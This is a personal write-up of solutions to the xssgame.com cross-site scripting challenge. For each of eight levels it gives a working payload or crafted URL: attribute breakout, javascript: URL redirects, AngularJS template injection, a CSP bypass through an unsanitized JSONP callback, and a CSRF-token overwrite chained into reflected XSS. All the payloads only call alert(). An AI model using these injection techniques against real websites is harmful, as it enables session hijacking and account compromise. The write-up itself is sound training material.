# [xssgame.com](http://xssgame.com/)

My solutions for the XSS Game.
I wasn't able to solve everything by myself.
Took [inspiration from here](https://github.com/NotSurprised/XSSgame-Writeup/) for level 3, 7 and 8.

## Level 1

The input is embedded as-is into the page that'll load next.

```
<script>alert()</script>
```

## Level 2

The input becomes an argument as follows `onload="startTime(' + input + ');"`.

```
3');alert('
```

This works because `3');` correctly terminates the original function call, `alert('` starts a new call, "ending" of the original one.

## Level 3

Entering the following URL into the search bar works.

```
http://www.xssgame.com/f/u0hrDTsXmyVJ/#'onerror='alert()'
```

Sometimes it told me for this and similar inputs that this is wrong, something about absolute URLs, etc., but it accepted it.
Try switching from single to double apostrophes, use `onload` instead, etc.

## Level 4

There's an intermediate navigation which sets `window.location` to a query string parameter's value.

```
http://www.xssgame.com/f/__58a1wgqGgI/confirm?next=javascript:alert()
```

## Level 5

The page is modified before Angular processing kicks in.
The `utm_term` query string parameter's value is injected into the value of `<input name="utm_term">`.

```
http://www.xssgame.com/f/JFTG_t7t3N-P/?utm_term={{alert()}}
```

## Level 6

Simply posting the form doesn't inject anything useful into the response HTML.
Issuing a GET request like `/?query={{alert}}` results in the modification of the form's `action` parameter, it'll end up like this: `<form action="/f/rWKWwJGnAeyi/?&lcub;&lcub;alert()}}"`.
The leading `{{` is dropped. Replacing it with an HTML entity works, however `&#123;` doesn't, only `&lcub;`.

```
http://www.xssgame.com/f/rWKWwJGnAeyi/?&lcub;&lcub;alert()}}
```

## Level 7

Sending a GET request to `http://www.xssgame.com/f/wmOM2q5NJnZS/?menu=...` by supplying the `menu` parameter a Base64 payload indirectly injects the following into the page.

```
<script src="jsonp?menu=' + encodeURIComponent(menu) + '">
```

Using `btoa('<script>alert();</script>')` as the payload doesn't quite work though, we get the following error.

```
Refused to execute inline script because it violates the following Content Security Policy directive: "default-src http://www.xssgame.com/f/wmOM2q5NJnZS/ http://www.xssgame.com/static/". Either the 'unsafe-inline' keyword, a hash ('sha256-/NOakGMgxH1rSep6q9+wRmM98LxyJLGvY2s9h3kZOjY='), or a nonce ('nonce-...') is required to enable inline execution. Note also that 'script-src' was not explicitly set, so 'default-src' is used as a fallback.
```

The error is due to the CSP set by the server-side. After the "trick" payload the DOM contains the following.

```
<h1>Error, no such menu: <script>alert();</script></h1>
```

Since the response body of the [JSONP](https://en.wikipedia.org/wiki/JSONP) call is `callback({"title":"Error, no such menu: <script>alert();</script>"})`.
This will execute the `callback(...)` function, which contains `if (data.title) document.write('<h1>' + data.title + '</h1>');`, essentially injecting whatever in the `data.title` into the page itself.

JSONP is [exploitable if callback names supplied to such an endpoint are unsanitized](https://en.wikipedia.org/wiki/JSONP#Callback_name_manipulation_and_reflected_file_download_attack), meaning we can do this.

```
btoa('<script src="jsonp?callback=alert"></script>')
```

This ends up in the DOM as follows.

```
<h1>Error, no such menu: <script src="jsonp?callback=alert"></script></h1>
```

Which doesn't trigger the CSP, but triggers a GET request with the following response body.

```
alert({"title":"Welcome to my Website!","pictures":["const.png"]})
```

## Level 8

There are two forms, the second requires a valid CSRF token to be passed along the request.
The first one looks like this.

```
<form method="GET" action="set">
    <input type="hidden" name="name" value="name">
    <input size="30" name="value" placeholder="Please specify your name">
    <input type="hidden" name="redirect" id="redirect" value="index">
    <input type="submit" value="Set">
</form>
```

There's a hidden input called `name` which is dangerous, it seems to allow setting of some parameter name on the backend instead of relying on a well-known value.

Because of this shortcoming `http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&value=x&redirect=index` works, essentially setting the CSRF token (the response headers contains the token with the value `x`).

To pass the challenge one navigation should do the trick, this is where the second form comes in the picture. Setting its `amount` parameter to `<script>alert()</script>` does the trick. Since the amount should be an integer a validation error message is injected into the page.

```
http://www.xssgame.com/f/d9u16LTxchEi/transfer?name=&amount=%3Cscript%3Ealert%28%29%3C%2Fscript%3E&csrf_token=x
```

However to pass the challenge all has to be done in one go. Since the first form contains a `redirect` parameter we can do this. We must tack the following at the end: `encodeURIComponent('transfer?name=&amount=<script>alert()</script>&csrf_token=x')`.

```
http://www.xssgame.com/f/d9u16LTxchEi/set?name=csrf_token&value=x&redirect=transfer%3Fname%3D%26amount%3D%3Cscript%3Ealert()%3C%2Fscript%3E%26csrf_token%3Dx
```
